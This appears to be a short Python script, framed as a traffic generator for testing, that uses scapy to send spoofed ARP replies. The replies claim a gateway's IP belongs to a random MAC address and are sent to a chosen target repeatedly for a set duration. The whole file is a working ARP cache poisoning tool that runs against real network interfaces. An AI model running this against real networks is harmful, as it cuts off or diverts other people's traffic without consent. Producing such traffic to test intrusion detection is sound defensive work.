from scapy.all import Ether, ARP, sendp
import argparse
import time
import random


def generate_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])


def arp_spoof(interface, target_ip, gateway_ip, duration, interval):
    # Generate a random MAC address for the 'attacker'
    attacker_mac = generate_mac()

    arp_reply = Ether() / ARP(op="is-at",
                              hwsrc=attacker_mac,
                              psrc=gateway_ip,
                              hwdst="ff:ff:ff:ff:ff:ff",
                              pdst=target_ip)

    print(f"Starting ARP spoofing attack simulation:")
    print(f"Interface: {interface}")
    print(f"Target IP: {target_ip}")
    print(f"Gateway IP: {gateway_ip}")
    print(f"Attacker MAC: {attacker_mac}")
    print(f"Duration: {duration} seconds")
    print(f"Interval: {interval} seconds")

    end_time = time.time() + duration
    while time.time() < end_time:
        sendp(arp_reply, iface=interface, verbose=False)
        print(f"Sent spoofed ARP reply: {gateway_ip} is-at {attacker_mac}")
        time.sleep(interval)

    print("ARP spoofing simulation completed.")


def main():
    parser = argparse.ArgumentParser(description="Generate ARP spoofing traffic for testing")
    parser.add_argument("interface", help="Network interface to use")
    parser.add_argument("target_ip", help="IP address of the target")
    parser.add_argument("gateway_ip", help="IP address of the gateway")
    parser.add_argument("--duration", type=int, default=60, help="Duration of the test in seconds (default: 60)")
    parser.add_argument("--interval", type=float, default=1,
                        help="Interval between ARP packets in seconds (default: 1)")

    args = parser.parse_args()

    arp_spoof(args.interface, args.target_ip, args.gateway_ip, args.duration, args.interval)


if __name__ == "__main__":
    main()